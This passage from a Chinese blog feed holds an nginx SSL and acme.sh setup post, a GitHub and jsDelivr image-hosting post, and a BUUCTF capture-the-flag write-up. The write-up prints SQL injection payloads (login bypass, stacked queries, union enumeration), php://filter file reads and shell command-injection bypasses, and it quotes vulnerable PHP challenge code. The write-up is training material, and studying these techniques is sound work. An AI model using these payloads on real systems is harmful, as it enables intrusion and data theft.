class="hljs-attribute">ssl_session_cache</span>   shared:SSL:<span class="hljs-number">10m</span>;<br>   <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">10m</span>;<br><br>   <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/conix.ml/cert.pem; <span class="hljs-comment"># 证书路径</span><br>   <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/conix.ml/key.pem; <span class="hljs-comment"># 请求认证 key 的路径</span><br><br>   <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;<br>   <span class="hljs-attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;<br>   <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br>   <span class="hljs-attribute">ssl_session_cache</span> shared:SSL:<span class="hljs-number">10m</span>;<br><br>   <span class="hljs-attribute">add_header</span> Access-Control-Allow-Origin *;<br>   <span class="hljs-attribute">add_header</span> Access-Control-Allow-Headers X-Requested-With;<br>   <span class="hljs-attribute">add_header</span> Access-Control-Allow-Methods GET,POST,OPTIONS;<br><br>   <span class="hljs-attribute">index</span> index.html index.htm;<br>   <span class="hljs-section">location</span> / &#123;<br>       <span class="hljs-attribute">root</span>  /var/www/html;<br>   &#125;<br>&#125;<br><br><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>   <span class="hljs-attribute">server_name</span> test.conix.ml;<br>   <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> https://<span class="hljs-variable">$server_name</span><span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中访问。</p><p><img src="https://upyun.wuuconix.link/image-20220129000227790.png" alt="浏览器中访问" /></p><p>成功进行SSL连接并且看到证书。</p><blockquote><p>这里突然发现颁发者是ZeroSSL，看来acme.sh默认的证书签发商已经不再是Let’s Encryp了。</p></blockquote></li></ol><h2 id="另外想说的"><a class="markdownIt-Anchor" href="#另外想说的"></a> 另外想说的</h2><p>实际上acme.sh更强大之处可以利用DNS解析商提供的api接口，完全自动进行SSL证书的签发，即不用手动写TXT记录，而程序自动写，当然了，这需要你在环境变量里设置好你的服务商的api接口的token供acme.sh调用。</p><p>但是CloudFlare对Freenom上白嫖的顶级域名做了限制，使得这种更简单的方法对<code>tk、ml、cf</code>等顶级域名失效。</p><p><img src="https://upyun.wuuconix.link/image-20220129000958283.png" alt="cloudflare" /></p><p>这里引用一位国外老哥在CloudFlare论坛上的话来评价这种行为。</p><p><img src="https://upyun.wuuconix.link/image-20220129001049981.png" alt="国外老哥" /></p><p>当然了，如果是正常购买的域名，完全可以用这种方式进行解析，我的<code>wuuconix.link</code>的二级泛域名证书就是利用阿里云的api接口实现全自动生成的。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ssl</tag>
      
      <tag>domain</tag>
      
      <tag>freenom</tag>
      
      <tag>cloudflare</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GitHub图床配合 jsDelivr实现大图存储</title>
    <link href="/2022/01/23/github-host/"/>
    <url>/2022/01/23/github-host/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-BtBdgbLn" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1885190399" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>我在去年7月底的博文 <a href="https://wuuconix.link/2021/07/27/image-host/">个人图床的搭建 - wuuconix’s blog</a> 中谈到了我的博客图床的搭建。</p><p>当时我用gitee来搭建图床，实现快速的图片访问，这个图床是成功的，到目前，我也一直沿用着那个gitee图床。</p><p>但是在这几个月中我也发现了一些问题。gitee对图片大小进行了限制，如果你上传的图片大小大于了1MB，那么是无法在线访问的。效果如下。</p><p><img src="https://upyun.wuuconix.link/image-20220123212905670.png" alt="提示" /></p><p>之前我对大图的解决办法是上传到qq空间，然后用qq空间的直链，但是你很有可能遇到下面的情况。</p><p><img src="https://upyun.wuuconix.link/image-20220123213206217.png" alt="不可引用" /></p><p>这个还算容易解决，最怕的一种情况是你无法确定这张qq空间图片的链接是不是永久链接，万一哪天qq空间不给你访问了就凉了。</p><p>我还有一个解决办法是上传到我搭建在国外服务器的chreveto项目，它是一个开源的图床项目。</p><p><img src="https://upyun.wuuconix.link/image-20220123213506918.png" alt="chvereto" /></p><p>很多图床网站都是基于此项目二次开发的。但是我的国外服务器面临着到期的困扰，而且据说最近服务商可能要跑路，所以我对存在我自己的chvereto上的图片也忧心忡忡。</p><p>当然了，我完全可以存在一些大型的图床上面，比如SM.MS之类的，但是图片不掌握在自己手里感觉又有些害怕。</p><h2 id="解决"><a class="markdownIt-Anchor" href="#解决"></a> 解决</h2><p>在之前我图床博文中，我提到了一些为什么不用github当图床的原因，其中最主要的原因就是它的图片链接不挂代理根本就看不了2333。</p><p>请在不使用代理的情况下访问以下链接。</p><blockquote><p><a href="https://raw.githubusercontent.com/wuuconix/fileHost/img/1634199142399.jpg">https://raw.githubusercontent.com/wuuconix/fileHost/img/1634199142399.jpg</a></p></blockquote><p>你会发现更本打不开，因为这个域名被墙了233。</p><p>但是这是可以解决的，jsDelivr作为免费且快速的CDN，为我们加速了github上的文件。我们可以使用以下链接访问到上面的图片。</p><p>它的url格式就是把域名换掉，然后把仓库的分支从<code>containter/branch</code>的形式写为了<code>container@branch</code>的形式。</p><p>而且最关键的是，github不像抠门的gitee，有1MB的限制。</p><p>同时配合上我们一直在用的picgo，就可以实现快速上传大图啦！</p><p><img src="https://upyun.wuuconix.link/image-20220123215326199.png" alt="picgo" /></p><h2 id="效果演示"><a class="markdownIt-Anchor" href="#效果演示"></a> 效果演示</h2><p>以下是一张4MB的大图，分别在github with jsDelivr和gitee上的表现</p><p><img src="https://gitee.wuuconix.link/95635319_p0.png" alt="gitee的表现" /></p><p>哈哈，我宣布gitee完败。</p><p>当然了，以后我小于1MB的图片仍然会存储在gitee上，毕竟是国内的托管厂商，速度还是更快的。</p><p>而面对大图也不用慌啦。</p><p>目前wuuconix’s blog中所有大图已经替换为jsDelivr链接，<a href="https://upyun.wuuconix.link">img.wuuconix.link</a> 也将停止服务。</p><p>我用必应快照记录下了它最后的样子。 <a href="https://cc.bingj.com/cache.aspx?q=img.wuuconix.link&amp;d=4643959447291400&amp;mkt=zh-CN&amp;setlang=zh-CN&amp;w=7xcoUrpA5bs_1DfTiF-EG2iUmVlbUXWK">必应快照</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>github</tag>
      
      <tag>jsDelivr</tag>
      
      <tag>图床</tag>
      
      <tag>cdn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF刷题记录</title>
    <link href="/2022/01/21/buuctf/"/>
    <url>/2022/01/21/buuctf/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-qRipNqTS" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1913652676" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>在家摸鱼太久啥都没干。突然想起自己好像是CTF半退役选手，便来做做题目当作益智游戏了。</p><h2 id="web-page-1"><a class="markdownIt-Anchor" href="#web-page-1"></a> Web Page 1</h2><h3 id="1-easysql"><a class="markdownIt-Anchor" href="#1-easysql"></a> 1. EasySQL</h3><p>万能密码</p><p>账号输入 <code>1' or 1=1#</code>，密码随便输即可，或者反过来，账号随便输，密码输入<code>1' or 1=1#</code>。</p><h3 id="2-warmup"><a class="markdownIt-Anchor" href="#2-warmup"></a> 2. WarmUp</h3><p>源代码发现 source.php。然后审计，发现传入一个file参数可以用来include file。同时通过hint.php得到flag在 ffffllllaaaagggg 文件中。然后利用目录遍历的技巧得到flag。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/?file=source.php%3F/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg<br></code></pre></td></tr></table></figure><h3 id="3-havefun"><a class="markdownIt-Anchor" href="#3-havefun"></a> 3. Havefun</h3><p>最简单的源码查看和get请求考察。</p><p>利用get方式传递cat=dog即可获得flag。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com/?cat=dog<br></code></pre></td></tr></table></figure><h3 id="4-include"><a class="markdownIt-Anchor" href="#4-include"></a> 4. Include</h3><p>简单的php伪协议利用，可以看到藏在注释中的flag。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">view-source:http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>然后base64解密即可。</p><p><img src="https://upyun.wuuconix.link/image-20220121134145053.png" alt="base64 -d" /></p><h3 id="5-随便注"><a class="markdownIt-Anchor" href="#5-随便注"></a> 5. 随便注</h3><p>该题目存在堆叠注入。即可以执行多条sql语句。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; show tables;#</span><br></code></pre></td></tr></table></figure><p>我们可以得到有两个表，分别是<code>1919810931114514</code>，<code>words</code>。猜测flag就在<code>1919810931114514</code>这个表中。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; show columns from `1919810931114514`;#</span><br></code></pre></td></tr></table></figure><p>发现flag列。</p><p>如果这道题的考点只有堆叠注入的话，我们就可以利用以下payload直接读出flag。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; select flag from `1919810931114514`;#</span><br></code></pre></td></tr></table></figure><p>但是这道题还过滤了一些常用命令，题目提示如下。</p><blockquote><p>return preg_match(&quot;/select|update|delete|drop|insert|where|./i&quot;,$inject);</p></blockquote><p>所以相当于我们离flag真的只有一墙之隔，正常来说，我们做sql注入题目很多时间都花在了确定flag所在的表，然后是所在的列，现在我们都知道了，但是无法查询。</p><p>查看过某位大佬的wp之后，我发现了一种我之前从未使用过的方式<code>PREPARE STATEMENT</code>，即预处理。</p><p>payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;Set @b=concat(&quot;sele&quot;,&quot;ct &quot;,&quot;* from `1919810931114514`&quot;);prepare dump from @b;execute dump;#</span><br></code></pre></td></tr></table></figure><p>解释一下，prepare会去预处理一个sql语句，这里被叫做dump。然后语句的具体内容由@b给定。而@b利用了concat来连接select的两部分，绕过了题目的检查，最后excute执行预处理语句，成功得到flag。</p><blockquote><p>参考资料如下。</p><p><a href="https://blog.csdn.net/weixin_45940434/article/details/106661111">SQL注入(堆叠注入)——强网杯2019随便注_cc菜的一批-CSDN博客</a></p><p><a href="https://www.begtut.com/mysql/mysql-prepared-statement.html">MySQL PREPARE语句 | 新手教程 (begtut.com)</a></p></blockquote><h3 id="6easysql"><a class="markdownIt-Anchor" href="#6easysql"></a> 6.EasySQL</h3><p>不得不说Web实在是太难了。</p><p>这道题我发现了堆叠注入，找到了Flag表。</p><p><img src="https://upyun.wuuconix.link/image-20220209153353059.png" alt="Flag表" /></p><p>可惜Flag关键字被过滤了，我们无法直接 <code>1; select * from Flag</code>。</p><p>于是我试着用上一道题了解到的预处理来绕过Flag。结果发现from也被过滤了，而预处理中需要from关键字作为结构。心态崩溃。</p><p>在网上搜索后我发现了这道题的源码。 <a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/easy_sql">SUCTF-2019/Web/easy_sql</a></p><p>源码的主要部分。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select &quot;</span> . <span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;query&#x27;</span>] . <span class="hljs-string">&quot;||flag from Flag&quot;</span>;<br><span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$MysqlLink</span>,<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p><code>mysqli_multi_query</code>函数使得这道题存在堆叠注入。然后我们通过输入框传入的参数会以<code>$post['query']</code>的形式插入到sql语句中。</p><p>由于sql语句中有<code>||</code>存在，<code>||</code>即逻辑或，实际上的结果只有0和1两种，我们无法获得flag。</p><p>我们可以通过传入<code>*, 1</code>从而构造出<code>select *, 1|flag from Flag</code>这个语句获得flag。</p><p>还可以通过设置<code>sql_mode</code>将管道符作为连接(concat)而非或运算符，从而得到flag。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">*</span>, <span class="hljs-number">1</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>对应<span class="hljs-keyword">sql</span>语句 <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>, <span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> Flag<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询结果 <span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> flag&#123;da7caaaa<span class="hljs-number">-8e1</span>c<span class="hljs-number">-4</span>b42<span class="hljs-operator">-</span>abb8<span class="hljs-number">-879328</span>bb7189&#125; [<span class="hljs-number">1</span>] <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">1</span> )<br><br><span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode<span class="hljs-operator">=</span>PIPES_AS_CONCAT;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>对应<span class="hljs-keyword">sql</span>语句 <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>; <span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode<span class="hljs-operator">=</span>PIPES_AS_CONCAT;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><span class="hljs-operator">||</span><span class="hljs-number">1</span>flag <span class="hljs-keyword">from</span> Flag <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询结果 <span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">1</span> ) <span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">1</span>flag&#123;da7caaaa<span class="hljs-number">-8e1</span>c<span class="hljs-number">-4</span>b42<span class="hljs-operator">-</span>abb8<span class="hljs-number">-879328</span>bb7189&#125; )<br></code></pre></td></tr></table></figure><p>经过这道题的教训，我打算以后的题目直接去看源码了（</p><h3 id="7exec"><a class="markdownIt-Anchor" href="#7exec"></a> 7.Exec</h3><p>简单的命令联合执行，熟悉linux的管道符就能做出来。</p><p>在github上找到了ACTF新生赛里本题的源码 <a href="https://github.com/CSUAuroraLab/ACTF_Junior_2020/blob/master/Web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/src/www/index.php">ACTF_Junior_2020/index.php </a></p><p>主要代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;target&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 3 &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;target&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php中调用了system函数来执行linux命令，我们在ping执行完后可以利用管道符来执行其他的命令。</p><p>payload</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span><span class="hljs-comment">; cat flag</span><br></code></pre></td></tr></table></figure><h3 id="8secret-file"><a class="markdownIt-Anchor" href="#8secret-file"></a> 8.Secret File</h3><p>阅读源码发现<code>Archive_room.php</code>。然后发现<code>action.php</code>，其设置了location http头，会进行快速页面跳转影响我们阅读。利用curl命令查看其内容。</p><p><img src="https://upyun.wuuconix.link/image-20220209182332122.png" alt="curl" /></p><p>发现<code>secre3t.php</code>文件。内容如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得知flag的文件位置<code>flag.php</code>，测试后推测flag在flag.php的php代码中，没有输出。</p><p>利用php伪协议读取base64后的文件并包含。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>x.node4.buuoj.cn:<span class="hljs-number">81</span><span class="hljs-regexp">/secr3t.php?file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>解码后得到flag。</p><h3 id="9lovesql"><a class="markdownIt-Anchor" href="#9lovesql"></a> 9.LoveSQL</h3><p>考察简单的union联合查询注入。</p><p>密码框里输入 <code>1' union select 1, 2, 3#</code>后发现2和3的位置出现了页面回显。那么这两个点都可以进行注入。</p><p>首先获得数据库名为geek</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>, <span class="hljs-built_in">database</span>(), <span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>然后查看geek库下面的数据表们 geekuser 和 l0ve1ysq1</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, group_concat(table_name), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;geek&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>查看后者花里胡哨的，先查它里面的字段 id,username,password</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, group_concat(column_name), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">&#x27;l0ve1ysq1&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>猜测flag在password字段里</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>, group<span class="hljs-constructor">_concat(<span class="hljs-params">username</span>)</span>, group<span class="hljs-constructor">_concat(<span class="hljs-params">password</span>)</span> from l0ve1ysq1 #<br></code></pre></td></tr></table></figure><p>发现最后一个记录就是flag。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,leixiao,flag！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Your password is &#x27;wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag</span><span class="hljs-template-variable">&#123;a3fc2519-e16f-4028-b3f6-f8f6294b99b5&#125;</span><span class="language-xml">&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>这道题变着花向我们介绍了一些师傅，密码设置的也非常有趣。</p><h3 id="10ping-ping-ping"><a class="markdownIt-Anchor" href="#10ping-ping-ping"></a> 10.Ping Ping Ping</h3><p>考察命令执行的绕过。</p><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123; <span class="hljs-comment">//过滤一堆符号</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123; <span class="hljs-comment">//过滤空格</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123; <span class="hljs-comment">//过滤bash</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123; <span class="hljs-comment">//过滤从左往右的f l a g</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>  <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单ls后发现flag.php，但是尝试cat的时候发现空格被过滤，可以用<code>$IFS$9</code>绕过空格。</p><p>然后flag也被过滤。可以使用变量拼接法、内联执行或者编码法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">//1.变量替换<br>//a=ag;<span class="hljs-built_in">cat</span> fl<span class="hljs-variable">$a</span>.php<br>?ip=1;a=ag;<span class="hljs-built_in">cat</span>$IFS$9fl<span class="hljs-variable">$a</span>.php<br><br>//2.内联执行，这种方法之前没用过 将<span class="hljs-built_in">ls</span>的所有文件全部<span class="hljs-built_in">cat</span>出来！<br>//cat `<span class="hljs-built_in">ls</span>`<br>?ip=1;<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`<br><br>//3.<span class="hljs-built_in">base64</span>解码后执行<br>//echo Y2F0IGZsYWcucGhwCg== | <span class="hljs-built_in">base64</span> -d | sh<br>?ip=1;<span class="hljs-built_in">echo</span>$IFS<span class="hljs-variable">$9Y2F0IGZsYWcucGhwCg</span>==|<span class="hljs-built_in">base64</span>$IFS<span class="hljs-variable">$9</span>-d|sh<br><br>//4.hex解码后执行 这种编码之前没用过<br>//echo 63617420666c61672e706870 | xxd -r -p | sh<br>?ip=1;<span class="hljs-built_in">echo</span>$IFS$963617420666c61672e706870$IFS<span class="hljs-variable">$9</span>|xxd$IFS<span class="hljs-variable">$9</span>-r$IFS<span class="hljs-variable">$9</span>-p|sh <br></code></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue3 解密 （持续更新中）</title>
    <link href="/2022/01/13/vue/"/>
    <url>/2022/01/13/vue/</url>
    
